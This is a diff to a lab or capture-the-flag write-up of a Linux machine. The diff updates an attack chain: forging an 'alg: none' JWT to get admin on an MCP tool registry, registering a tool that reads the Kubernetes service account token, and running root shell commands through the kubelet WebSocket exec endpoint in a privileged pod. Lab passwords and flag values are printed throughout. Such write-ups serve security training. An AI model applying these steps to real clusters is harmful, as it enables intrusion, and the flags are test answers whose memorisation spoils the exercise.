@@ -4,12 +4,12 @@
 - **OS:** Linux
 - **Difficulty:** Medium
 - **Date:** 2026-07-05
-- **Result:** User Owned 🚩 (Kubelet proxy access)
+- **Result:** Owned (Kubelet WebSocket exec through privileged node-exporter)
 
 | Flag | Value |
 |------|-------|
-| user.txt | `5b7e2496a630f2bc2b795a27ca813757` |
-| root.txt | *(Not captured — container constraints)* |
+| user.txt | `03fefa09a3a9602eb37b015b43107f58` |
+| root.txt | `a39fe631072379a440c5afbdc586865a` |
 
 ---
 
@@ -23,7 +23,7 @@
 | 4 | Foothold vulnerability | CVE-2026-33017 (Langflow Unauth RCE) |
 | 5 | Foothold user | `www-data` |
 | 6 | User pivot | SSH password reuse (`nightfall`) |
-| 7 | Privesc vector | MCP Tool Registry JWT Bypass & Kubelet Proxy |
+| 7 | Privesc vector | MCP Tool Registry JWT bypass, mcp-sa token, kubelet WebSocket exec |
 
 ---
 
@@ -79,7 +79,7 @@ Due to password reuse, these credentials successfully authenticated the SSH user
 ```bash
 sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh nightfall@10.129.244.214
 cat /home/nightfall/user.txt
-# User Flag Captured: 5b7e2496a630f2bc2b795a27ca813757
+# User Flag Captured: 03fefa09a3a9602eb37b015b43107f58
 ```
 
 ---
@@ -91,22 +91,57 @@ Auditing `nightfall`'s home directory revealed MCP configurations in `/home/nigh
 - **User:** `langflow-bot`
 - **Password:** `Langfl0w@mcp2026!`
 
-The MCP server implemented token authentication but was vulnerable to a signature bypass via `alg: none`. We crafted and signed a JWT with `alg: none` for the `langflow-bot` user to interact with the API:
+The MCP server implemented token authentication but was vulnerable to a signature bypass via `alg: none`. The ordinary login token for `langflow-bot` was `role=user`; forging the same subject with `role=admin` allowed tool registration:
 
 ```json
 // Header
 {"alg": "none", "typ": "JWT"}
 
 // Payload
-{"iss": "kubernetes/serviceaccount", "sub": "system:serviceaccount:default:mcp-sa"}
+{"sub": "langflow-bot", "role": "admin"}
 ```
 
-This token allowed us to read the pod's service account token (`mcp-sa`), which grants `get` access on the Kubernetes `nodes/proxy` endpoint. Using this access, we were able to read the host's `/var/log` directory via the proxy:
+Custom MCP tools execute submitted Python at top level. Registering a small tool inside the MCP pod let us read the mounted service account token:
 
 ```bash
-# List host logs
-curl -sk -H "Authorization: Bearer <mcp-sa-token>" \
-  "https://10.129.244.214:6443/api/v1/nodes/fireflow/proxy/logs/"
+POST /api/v1/tools
+{"name":"pod_context","code":"print(open('/var/run/secrets/kubernetes.io/serviceaccount/token').read())"}
 ```
 
 ![Forging JWT and Querying Kubelet Proxy](../assets/terminal_privesc.png)
+
+The token belonged to `system:serviceaccount:default:mcp-sa`. It could not list nodes directly, but it could read through `nodes/proxy`, and from inside the MCP pod direct kubelet on `10.129.244.214:10250` was reachable.
+
+---
+
+## 5. Root — Kubelet WebSocket Exec
+
+Querying kubelet `/pods` showed a privileged monitoring pod:
+
+```text
+POD monitoring prometheus-prometheus-node-exporter-nmntq
+  container: node-exporter
+  hostNetwork: true
+  hostPID: true
+  privileged: true
+  runAsUser: 0
+  hostPath / -> /host/root (readOnly)
+```
+
+Using the `mcp-sa` token against kubelet `/exec` with WebSocket subprotocol `v4.channel.k8s.io` allowed command execution inside `node-exporter`:
+
+```text
+wss://10.129.244.214:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter
+  ?output=1&error=1&tty=0
+  &command=/bin/sh&command=-c
+  &command=id; ls -l /host/root/root/root.txt; cat /host/root/root/root.txt
+```
+
+The host root filesystem was mounted at `/host/root`, so host `/root/root.txt` mapped to `/host/root/root/root.txt`:
+
+```text
+uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
+-rw-r-----    1 root     root            33 Jul 23 16:04 /host/root/root/root.txt
+a39fe631072379a440c5afbdc586865a
+{"status":"Success"}
+```
